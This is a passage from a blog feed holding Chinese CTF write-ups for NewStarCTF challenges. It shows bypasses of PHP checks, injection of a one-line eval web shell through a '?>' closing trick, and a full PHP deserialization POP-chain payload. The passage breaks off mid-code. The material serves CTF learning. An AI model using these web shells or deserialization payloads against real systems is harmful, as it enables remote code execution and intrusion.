src="/2023/02/13/SekaiCTF-wp/image-20221003162948932.png" alt="image-20221003162948932"></p><p><strong>å¾—åˆ°flag</strong></p>]]></content>
      
      
      <categories>
          
          <category> ç½‘ç»œå®‰å…¨å­¦ä¹  </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Game </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>NewStarCTFå…¬å¼€èµ›</title>
      <link href="/2023/02/13/NewStarCTF-wp/"/>
      <url>/2023/02/13/NewStarCTF-wp/</url>
      
        <content type="html"><![CDATA[<h1 id="NewStarCTFå…¬å¼€èµ›"><a href="#NewStarCTFå…¬å¼€èµ›" class="headerlink" title="NewStarCTFå…¬å¼€èµ›"></a>NewStarCTFå…¬å¼€èµ›</h1><p><code>è™½ç„¶æ˜¯åˆ«äººå­¦æ ¡çš„æ–°ç”Ÿèµ›ï¼Œéš¾åº¦ä¸æ˜¯å¾ˆé«˜ï¼Œä½†æ˜¯è¿˜æ˜¯æœ‰è®¸å¤šå€¼å¾—å­¦ä¹ çš„çŸ¥è¯†ç‚¹</code></p><h2 id="1-NotPHP"><a href="#1-NotPHP" class="headerlink" title="1.NotPHP"></a>1.NotPHP</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;data&#x27;</span>]) == <span class="string">&quot;Welcome to CTF&quot;</span>)&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">md5</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;key1&#x27;</span>]) === <span class="title function_ invoke__">md5</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;key2&#x27;</span>]) &amp;&amp; <span class="variable">$_GET</span>[<span class="string">&#x27;key1&#x27;</span>] !== <span class="variable">$_GET</span>[<span class="string">&#x27;key2&#x27;</span>])&#123;</span><br><span class="line">        <span class="keyword">if</span>(!<span class="title function_ invoke__">is_numeric</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;num&#x27;</span>]) &amp;&amp; <span class="title function_ invoke__">intval</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;num&#x27;</span>]) == <span class="number">2077</span>)&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;Hack Me&quot;</span>;</span><br><span class="line">            <span class="keyword">eval</span>(<span class="string">&quot;#&quot;</span>.<span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>]);</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;Number error!&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;Wrong Key!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;Pass it!&quot;</span>);</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><p>è¿™é‡Œç»•è¿‡ä¸ç»†è®²ï¼Œéƒ½æ˜¯å¸¸è§çš„</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">eval</span>(<span class="string">&quot;#&quot;</span>.<span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>]);</span><br></pre></td></tr></table></figure><p>ç»†è®²è¿™ä¸ª</p><p>è¿™ä¸ªæ˜¯ä¸€ä¸ª<code>eval</code>å‡½æ•°ï¼Œä½†æ˜¯é‡Œé¢å…¶å®å·²ç»è¢«<code>#</code>ç»™æ³¨é‡Šæ‰äº†ï¼Œ</p><p>æ‰€ä»¥æ— è®ºè¾“å…¥ä»€ä¹ˆéƒ½æ²¡ç»“æœ</p><hr><p>å› æ­¤éœ€è¦é—­åˆæˆ–è€…ç»•è¿‡<code>#</code></p><p>ä½†æ˜¯æˆ‘è¯•äº†å¾ˆå¤šé—­åˆæ–¹å¼ï¼Œç»“æœéƒ½æ²¡ååº”</p><p>æœ€åå‘ç°</p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">?&gt;</span></span><br></pre></td></tr></table></figure><p>å®ç°äº†è¯­å¥é—­åˆï¼Œ</p><p>ä½†æ˜¯ï¼Œå½“æŠŠè¿™ä¸ªphpç»“å°¾ç¬¦åŠ åˆ°åé¢æ—¶å€™ï¼Œè¿™ä¸ªphpå°±å°±ç»“æŸäº†</p><p>ä»¥</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">eval</span>(<span class="string">&quot;#&quot;</span>.<span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>]);</span><br></pre></td></tr></table></figure><p>ä¸ºä¾‹å­</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">url/xxx&amp;cmd=?&gt;haha</span><br></pre></td></tr></table></figure><p>å½“æˆ‘ä»¬é—­åˆäº†phpä»£ç åï¼Œé‚£åé¢çš„<code>haha</code>çš„ä½ç½®åœ¨å“ªé‡Œå‘¢</p><p><img src="/2023/02/13/NewStarCTF-wp/image-20220921083750913.png" alt="image-20220921083750913"></p><p>æˆ‘ä»¬å¯ä»¥çœ‹åˆ°ï¼Œ<code>haha</code>å˜æˆäº†<code>html</code>ä»£ç </p><p>é‚£ä¹ˆå°±å¯ä»¥æ“ä½œäº†ï¼Œ</p><p>æ¯”å¦‚xssï¼Œä¸€å¥è¯ğŸçš„æ’å…¥ç­‰</p><p>xssæˆ‘è¯•äº†ï¼Œæ²¡æœ‰ç»“æœï¼Œç°åœ¨çš„xssåˆ©ç”¨å±‚é¢å’Œå±å®³ä¹Ÿä¸é«˜äº†ï¼ˆå¯èƒ½æ˜¯æˆ‘æŠ€æœ¯ä¸åˆ°ä½ï¼‰</p><hr><p>æ’å…¥ä¸€å¥è¯ğŸ</p><p>å¼€å§‹å› ä¸ºæ˜¯<code>html</code>ï¼Œæˆ‘æ˜¯è¯•äº†<code>jsp</code>ä¸€å¥è¯</p><figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script language=<span class="string">&quot;php&quot;</span>&gt;<span class="meta">@eval($_POST[&quot;cmd&quot;])</span>;&lt;/script&gt;</span><br></pre></td></tr></table></figure><p>ä½†æ˜¯ç”¨èšå‰‘è¿ä¸ä¸Š</p><p>æœ€åæŒ‰ç…§ä¼ ç»Ÿæ€è·¯ï¼Œæˆ‘åœ¨åé¢æ’å…¥<code>php</code>ä¸€å¥è¯</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> @<span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="string">&quot;cmd&quot;</span>]);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>å¥½å®¶ä¼™ï¼Œä¼ ç»Ÿæ€è·¯ï¼Œæ‰æ˜¯çœŸ</p><p>è¿æ¥æˆåŠŸæ‹¿åˆ°<code>flag</code></p><hr><p>ä¸çŸ¥é“æœ‰æ²¡æœ‰çœ‹åˆ°è¿™ç¯‡æ–‡ç« çš„åŒå­¦çœ‹åˆ°è¿™ä¸ª<code>wp</code>ï¼Œæé†’ä¸€ä¸‹ï¼Œè¿™é‡Œéœ€è¦åœ¨<code>http body</code>é‡Œè¡¥å……<code>num</code>è¯·æ±‚ä¿¡æ¯</p><p>å› ä¸ºè¿™ä¹Ÿæ˜¯ç»•è¿‡çš„ä¸€ä¸ªç¯èŠ‚</p><p><img src="/2023/02/13/NewStarCTF-wp/image-20220921084836402.png" alt="image-20220921084836402"></p><hr><h2 id="2-UnserializeOne"><a href="#2-UnserializeOne" class="headerlink" title="2.UnserializeOne"></a>2.UnserializeOne</h2><p>ä¸€é“<code>popchain</code>ï¼Œè¿™è¿˜æ˜¯æˆ‘ç¬¬ä¸€æ¬¡åš<code>popchain</code>ç±»ã€æƒ­æ„§ï¼Œä¸è¿‡åšç€çœŸæœ‰æ„æ€ã€‘</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="comment">#Something useful for you : https://zhuanlan.zhihu.com/p/377676274</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Start</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span>;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$func</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;Welcome to NewStarCTF, &quot;</span>.<span class="variable language_">$this</span>-&gt;name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__isset</span>(<span class="params"><span class="variable">$var</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        (<span class="variable language_">$this</span>-&gt;func)();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Sec</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$obj</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$var</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;obj-&gt;<span class="title function_ invoke__">check</span>(<span class="variable">$this</span>-&gt;<span class="keyword">var</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;CTFers&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&#x27;/flag&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Easy</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$cla</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params"><span class="variable">$fun</span>, <span class="variable">$var</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;cla = <span class="keyword">clone</span> <span class="variable">$var</span>[<span class="number">0</span>];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">eeee</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$obj</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__clone</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable language_">$this</span>-&gt;obj-&gt;cmd))&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;success&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;pop&#x27;</span>]))&#123;</span><br><span class="line">    <span class="title function_ invoke__">unserialize</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;pop&#x27;</span>]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æ„é€ <code>pop</code>é“¾ä¸»è¦åœ¨äºï¼Œ</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">æŠŠæˆ‘ä»¬éœ€è¦è§¦å‘çš„é­”æœ¯æ–¹æ³•è”ç³»åœ¨ä¸€èµ·ï¼Œè€Œä¸”åœ¨è”ç³»è§¦å‘è¿‡ç¨‹ä¸­ä¹Ÿè¦è®°å¾—å®ä¾‹åŒ–ç›®æ ‡ç±»ï¼Œè¿™æ ·æ‰èƒ½è°ƒç”¨å’Œæ‰§è¡Œå…¶ä¸­çš„æ–¹æ³•</span><br></pre></td></tr></table></figure><p>æˆ‘ä»¬å…ˆä¸­æ¯ä¸ªç±»å…¶ä¸­çš„é­”æœ¯æ–¹æ³•åˆ—å‡ºæ¥çœ‹çœ‹ï¼Œå†åˆ†æä¸€ä¸‹</p><p><code>Start</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Start</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span>;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$func</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">     //<span class="title">__destruct</span>(<span class="params"></span>)ï¼Œå¯¹è±¡è¢«é”€æ¯æ—¶è§¦å‘ï¼Œä¹Ÿå°±æ˜¯æœ€åè¿è¡Œç»“æŸæ—¶è§¦å‘</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;Welcome to NewStarCTF, &quot;</span>.<span class="variable language_">$this</span>-&gt;name;</span><br><span class="line">      <span class="comment">//è¿™é‡Œè¿›è¡Œecho $this-&gt;nameï¼Œå¦‚æœ$this-&gt;nameæ˜¯ä¸€ä¸ªç±»å°±ä¼šè°ƒç”¨Sec()ç±»é‡Œ__toString()</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__isset</span>(<span class="params"><span class="variable">$var</span></span>)</span></span><br><span class="line"><span class="function">   //<span class="title">__isset</span>(<span class="params"></span>)ï¼Œå½“å¯¹ä¸å¯è®¿é—®å±æ€§è°ƒç”¨<span class="title">isset</span>(<span class="params"></span>)æˆ–<span class="title">empty</span>(<span class="params"></span>)æ—¶è°ƒç”¨</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        (<span class="variable language_">$this</span>-&gt;func)();</span><br><span class="line">        <span class="comment">//è¿™é‡ŒæŠŠ$this-&gt;funcå½“ä½œä¸€ä¸ªå‡½æ•°ï¼Œæ‰§è¡Œ$this-&gt;func()</span></span><br><span class="line">        <span class="comment">//å¦‚æœ$this-&gt;funcä¸æ˜¯ä¸€ä¸ªæ­£ç¡®çš„å‡½æ•°åï¼Œå°±ä¼šè°ƒç”¨Secç±»é‡Œ__invoke()</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>Sec</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Sec</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$obj</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$var</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">  //<span class="title">__toString</span>(<span class="params"></span>)ï¼ŒæŠŠç±»å½“åšå­—ç¬¦ä¸²æ—¶è§¦å‘ï¼Œ</span></span><br><span class="line"><span class="function">  //æ‰€ä»¥åœ¨<span class="title">Start</span>ç±»ä¸­çš„[<span class="title">echo</span> &quot;<span class="title">Welcome</span> <span class="title">to</span> <span class="title">NewStarCTF</span>, &quot;.$<span class="title">this</span>-&gt;<span class="title">name</span></span>;]ï¼Œå°±éœ€è¦æŠŠnameå€¼èµ‹å€¼ä¸ºSecç±»å</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;obj-&gt;<span class="title function_ invoke__">check</span>(<span class="variable">$this</span>-&gt;<span class="keyword">var</span>);</span><br><span class="line">       <span class="comment">//è¿™é‡Œæƒ³è°ƒç”¨this-&gt;objçš„checkæ–¹æ³•</span></span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;CTFers&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">     //<span class="title">__invoke</span>(<span class="params"></span>)ï¼Œå½“è„šæœ¬å°è¯•å°†å¯¹è±¡è°ƒç”¨ä¸ºå‡½æ•°æ—¶è§¦å‘</span></span><br><span class="line"><span class="function">   //æ‰€ä»¥åœ¨<span class="title">Start</span>ç±»ä¸­çš„[$<span class="title">this</span>-&gt;<span class="title">func</span>)(<span class="params"></span>)</span>;]ä¸­ï¼Œéœ€è¦æŠŠfuncå€¼èµ‹å€¼ä¸ºSecï¼Œä»è€ŒæŠŠå…¶å½“ä½œå‡½æ•°æ‰§è¡Œæ—¶ï¼Œä»è€Œè§¦å…¶é­”æœ¯æ–¹æ³•</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&#x27;/flag&#x27;</span>);</span><br><span class="line">      <span class="comment">//è¿™é‡Œå°±æ˜¯ç›®æ ‡ï¼Œæ‰§è¡Œæ–‡ä»¶åŒ…å«flagè¾“å‡ºå†…å®¹</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>Easy</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Easy</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$cla</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params"><span class="variable">$fun</span>, <span class="variable">$var</span></span>)</span></span><br><span class="line"><span class="function">   //<span class="title">__call</span>(<span class="params"></span>)ï¼Œåœ¨å¯¹è±¡ä¸Šä¸‹æ–‡ä¸­è°ƒç”¨ä¸å¯è®¿é—®çš„æ–¹æ³•æ—¶è§¦å‘</span></span><br><span class="line"><span class="function">   //æ‰€ä»¥åœ¨<span class="title">Sec</span>ç±»ä¸­ï¼Œå½“<span class="title">this</span>-&gt;<span class="title">obj</span>èµ‹å€¼ä¸º<span class="title">Easy</span>ç±»æ—¶ï¼Œè°ƒç”¨<span class="title">check</span>æ–¹æ³•æ—¶ï¼Œå°±ä¼šè§¦å‘ï¼Œå› ä¸º<span class="title">Easy</span>é‡Œæ²¡æœ‰<span class="title">check</span>å‡½æ•°</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;cla = <span class="keyword">clone</span> <span class="variable">$var</span>[<span class="number">0</span>];</span><br><span class="line">        <span class="comment">//è¿™é‡Œè°ƒç”¨cloneï¼Œå½“å¯¹è±¡å®Œæˆå¤åˆ¶æ—¶ä¼šæ‰§è¡Œeeeeé‡Œçš„__clone</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>eeee</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">eeee</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$obj</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__clone</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable language_">$this</span>-&gt;obj-&gt;cmd))&#123;</span><br><span class="line">            <span class="comment">//è¿™é‡Œæ˜¯å¯¹$this-&gt;objçš„cmdå±æ€§ä½¿ç”¨issetå‡½æ•°ï¼Œä½†æ˜¯å¹¶ä¸å­˜åœ¨cmdå±æ€§</span></span><br><span class="line">            <span class="comment">//æ‰€ä»¥æŠŠthis-&gt;objèµ‹å€¼ä¸ºStratç±»åï¼Œä»è€Œè§¦å‘__isset</span></span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;success&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æ•´ç†ä¸€ä¸‹</p><figure class="highlight zephir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">Start::__destruct</span><br><span class="line"></span><br><span class="line">==&gt;</span><br><span class="line"></span><br><span class="line">Sec::__toString</span><br><span class="line"></span><br><span class="line">==&gt;</span><br><span class="line"></span><br><span class="line">Easy::__call</span><br><span class="line"></span><br><span class="line">==&gt;</span><br><span class="line"></span><br><span class="line">eeee::__clone</span><br><span class="line"></span><br><span class="line">==&gt;</span><br><span class="line"></span><br><span class="line">Start::__isset</span><br><span class="line"></span><br><span class="line">==&gt;</span><br><span class="line"></span><br><span class="line">Sec::__invoke</span><br></pre></td></tr></table></figure><p>äºæ˜¯<code>payload</code>ä¸º</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="comment">#Something useful for you : https://zhuanlan.zhihu.com/p/377676274</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Start</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$func</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Sec</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$obj</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$var</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Easy</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$cla</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">eeee</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$obj</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$start</span>=<span class="keyword">new</span> <span class="title class_">Start</span>();</span><br><span class="line"><span class="variable">$sec</span>=<span class="keyword">new</span> <span class="title class_">Sec</span>();</span><br><span class="line"><span class="variable">$easy</span>=<span class="keyword">new</span> <span class="title class_">Easy</span>();</span><br><span class="line"><span class="variable">$eeee</span>=<span class="keyword">new</span> <span class="title function_ invoke__">eeee</span>();</span><br><span class="line"></span><br><span class="line"><span class="variable">$start</span>-&gt;name=<span class="variable">$sec</span>;</span><br><span class="line"><span class="variable">$start</span>-&gt;func=<span class="variable">$sec</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$sec</span>-&gt;obj=<span class="variable">$easy</span>;</span><br><span class="line"><span class="variable">$sec</span>-&gt;<span class="keyword">var</span>=<span class="variable">$eeee</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$eeee</span>-&gt;obj=<span class="variable">$start</span>;</span><br><span class="line"><span class="comment">//å› 